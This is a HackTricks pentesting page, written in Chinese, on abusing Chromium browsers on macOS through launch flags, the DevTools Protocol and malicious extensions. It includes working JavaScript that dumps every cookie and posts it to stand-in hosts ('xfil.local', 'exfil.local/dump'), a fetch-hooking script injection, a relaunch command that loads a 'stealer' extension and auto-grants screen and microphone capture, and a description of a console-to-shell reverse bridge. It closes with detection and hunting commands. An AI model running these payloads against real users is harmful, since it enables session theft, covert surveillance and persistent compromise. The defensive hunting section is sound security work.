# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## 基本信息

基于 Chromium 的浏览器，例如 Google Chrome、Microsoft Edge、Brave、Arc、Vivaldi 和 Opera，都使用相同的命令行开关、偏好设置文件和 DevTools automation interfaces。在 macOS 上，任何拥有 GUI 访问权限的用户都可以终止现有浏览器会话，并使用任意 flags、extensions 或 DevTools endpoints 重新打开浏览器，而这些组件会以目标用户的 entitlements 运行。

#### 在 macOS 上使用自定义 flags 启动 Chromium

macOS 为每个 Chromium profile 保持一个 UI 实例，因此 instrumentation 通常需要强制关闭浏览器（例如使用 `osascript -e 'tell application "Google Chrome" to quit'`）。攻击者通常通过 `open -na "Google Chrome" --args <flags>` 重新启动浏览器，从而无需修改 app bundle 即可注入 arguments。将该命令封装到用户 LaunchAgent（`~/Library/LaunchAgents/*.plist`）或 login hook 中，可以确保被篡改的浏览器在重启或注销后重新启动。

#### `--load-extension` Flag

`--load-extension` flag 会自动加载 unpacked extensions（以逗号分隔的路径）。将其与 `--disable-extensions-except` 配合使用，可以阻止合法 extensions，同时强制仅运行你的 payload。恶意 extensions 可以请求 `debugger`、`webRequest` 和 `cookies` 等高影响权限，从而 pivot 到 DevTools protocols、修改 CSP headers、降级 HTTPS，或在浏览器启动后立即 exfiltrate session material。

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

这些 switches 通过 TCP 或 pipe 暴露 Chrome DevTools Protocol（CDP），使外部 tooling 能够驱动浏览器。Google 观察到该 interface 被 infostealer 广泛滥用，并从 Chrome 136（2025 年 3 月）开始，除非浏览器使用非标准的 `--user-data-dir` 启动，否则这些 switches 会被 default profile 忽略。此举在真实 profiles 上强制启用 App-Bound Encryption，但攻击者仍可以生成一个 fresh profile，诱使受害者在其中进行 authentication（phishing/triage assistance），并通过 CDP harvest cookies、tokens、device trust states 或 WebAuthn registrations。

#### `--user-data-dir` Flag

该 flag 会将整个 browser profile（History、Cookies、Login Data、Preference files 等）重定向到攻击者控制的路径。在将现代 Chrome builds 与 `--remote-debugging-port` 结合使用时，这是必需的；它还可以保持被篡改的 profile 隔离，使你能够放置预填充的 `Preferences` 或 `Secure Preferences` files，以禁用 security prompts、自动安装 extensions 并更改 default schemes。

#### `--use-fake-ui-for-media-stream` Flag

该 switch 会绕过 camera/mic permission prompt，使任何调用 `getUserMedia` 的页面立即获得访问权限。将其与 `--auto-select-desktop-capture-source="Entire Screen"`、`--kiosk` 等 flags 或 CDP `Browser.grantPermissions` commands 结合，可以在不与用户交互的情况下静默 capture audio/video、共享桌面，或满足 WebRTC permission checks。

## 现实中常见的 Delivery & Relaunch Patterns

CDP abuse 通常是 **post-exploitation** 阶段，而不是 initial payload。最近一次针对 macOS developer 的 campaign 使用了被投毒的 Xcode **`Run Script` build phase**（`PBXShellScriptBuildPhase`），使 code 仅在受害者 **build** project 时执行，而不是在受害者仅 clone 或 open project 时执行。首次执行后，malware 还会感染其他 `.xcodeproj` trees，添加恶意 Git `pre-commit` hooks，并在 ZIP archives 中搜索更多 Xcode projects。

对于 Chromium abuse 而言，这一点很重要，因为攻击者无需 patch browser binary 本身。一个短生命周期的 build-phase / `osascript` stager 可以改为安装一个 **browser wrapper**（LaunchAgent、login item、Dock entry、trojanized app launcher 等），使其在用户每次启动 legitimate browser 时，都使用攻击者控制的 flags 重新打开浏览器。

> [!TIP]
> 在 developer endpoints 上，检查 `.pbxproj` files、`.git/hooks/pre-commit` 和包含 `.xcodeproj` 的 ZIPs，留意意外出现的 `curl`、`osascript`、`xxd`、嵌套的 `base64` 或 Chrome relaunch logic。

## Remote Debugging & DevTools Protocol Abuse

Chrome 使用专用的 `--user-data-dir` 和 `--remote-debugging-port` 重新启动后，你可以通过 CDP（例如使用 `chrome-remote-interface`、`puppeteer` 或 `playwright`）连接，并编写高权限 workflows：

- **Cookie/session theft：** `Network.getAllCookies` 和 `Storage.getCookies` 会返回 HttpOnly values，即使 App-Bound encryption 通常会阻止 filesystem access；这是因为 CDP 要求运行中的 browser 对这些 values 进行 decrypt。
- **Permission tampering：** `Browser.grantPermissions` 和 `Emulation.setGeolocationOverride` 可以绕过 camera/mic prompts（尤其是与 `--use-fake-ui-for-media-stream` 结合时），或伪造基于 location 的 security checks。
- **Keystroke/script injection：** `Runtime.evaluate` 可以在 active tab 中执行任意 JavaScript，从而实现 credential lifting、DOM patching，或注入能够跨 navigation 持续存在的 persistence beacons。
- **Live exfiltration：** `Network.webRequestWillBeSentExtraInfo` 和 `Fetch.enable` 可以实时拦截 authenticated requests/responses，而无需接触磁盘 artifacts。
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
由于 Chrome 136 会在 default profile 上阻止 CDP，将受害者现有的 `~/Library/Application Support/Google/Chrome` 目录复制到 staging path 不再能够获得解密后的 cookies。相反，可以通过 social-engineer 用户，让其在 instrumented profile 中完成身份验证（例如进行一次“热心”的 support session），或者通过 CDP-controlled network hooks 在传输过程中捕获 MFA tokens。

### XCSSET-style CDP Backdoor Chain

一种实用的 malware 模式是：

1. 每次 Chrome 启动时，重启 userland implant 或 wrapper。
2. 使用 `--remote-debugging-port=<port>` 启动 legitimate browser；在 Chrome 136 及更高版本上，通常还需要配对一个非默认的 `--user-data-dir=<dir>`。
3. 启动一个 helper，使其连接到本地 CDP WebSocket，并使用 `Page.addScriptToEvaluateOnNewDocument` 注册 pre-document hook。

该 helper 可以在 site code 运行前注入 JavaScript，非常适合 hook `window.fetch`、`XMLHttpRequest`、wallet providers 或 autofill flows，而无需修改磁盘上的文件。
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
更强的变体会将 browser 变成 **host command bridge**：注入的 JavaScript 发出带 delimiter 标记的 `console.log`，本地 helper 监听 `Runtime.consoleAPICalled`，移除 marker，通过 host shell 执行剩余内容（例如 Go 的 `exec.Command`），并通过攻击者的 WebSocket 返回 stdout/stderr。这会将 tab 级别的 script execution 升级为基本无文件的 reverse shell。

## 基于 Extension 的 Injection via Debugger API

2023 年的 "Chrowned by an Extension" research 证明，使用 `chrome.debugger` API 的 malicious extension 可以 attach 到任意 tab，并获得与 `--remote-debugging-port` 相同的 DevTools 权限。这打破了原有的 isolation 假设（extensions 保持在自己的 context 中），并支持：

- 使用 `Network.getAllCookies`/`Fetch.getResponseBody` 静默窃取 cookie 和 credentials。
- 修改 site permissions（camera、microphone、geolocation）并绕过 security interstitial，使 phishing pages 能够冒充 Chrome dialogs。
- 通过编程方式驱动 `Page.handleJavaScriptDialog`、`Page.setDownloadBehavior` 或 `Security.handleCertificateError`，篡改 TLS warnings、downloads 或 WebAuthn prompts。

使用 `--load-extension`/`--disable-extensions-except` 加载 extension，这样无需用户交互。一个 weaponize 该 API 的最小 background script 如下：
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
该 extension 还可以订阅 `Debugger.paused` 事件，以读取 JavaScript 变量、patch inline scripts，或添加可跨 navigation 保留的自定义断点。由于所有操作都在用户的 GUI session 内运行，因此不会触发 Gatekeeper 和 TCC，这使该技术非常适合已经在用户 context 下获得 execution 的 malware。

## Detection & Hunting

- 对使用 `--remote-debugging-port`、`--remote-debugging-pipe` 或可疑 `--user-data-dir` 启动的 Chromium browsers 生成 alert，尤其是其 parent 为 `bash`、`sh`、`osascript`、`xcodebuild` 或 LaunchAgent helper 时。
- 查找以下短链：helper 打开本地 CDP WebSocket，注册 `Page.addScriptToEvaluateOnNewDocument`，随后建立长时间存在的 outbound WebSocket/HTTPS connection。
- 通过将 browser 的 `Runtime.consoleAPICalled` activity 与执行 attacker-supplied commands 的 child shells 或 helper processes 进行关联，hunting console-to-shell bridges。
- 在 developer Macs 上，检查 `.pbxproj` 中的 `PBXShellScriptBuildPhase` entries、Git `pre-commit` hooks、Dock/login item relaunchers，以及 ZIP-contained Xcode projects，查找 browser wrapper installation。
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### 工具

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - 使用 payload extensions 自动启动 Chromium，并公开交互式 CDP hooks。
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - 类似的 tooling，专注于 traffic interception 和面向 macOS operators 的 browser instrumentation。
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - 用于编写 Chrome DevTools Protocol dumps 脚本的 Node.js library；在 `--remote-debugging-port` instance 运行后，可获取 cookies、DOM 和 permissions。

### 示例
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
在工具链接中查找更多示例。

## 参考资料

- [https://chromedevtools.github.io/devtools-protocol/v8/Runtime/](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [https://chromedevtools.github.io/devtools-protocol/tot/Page/](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
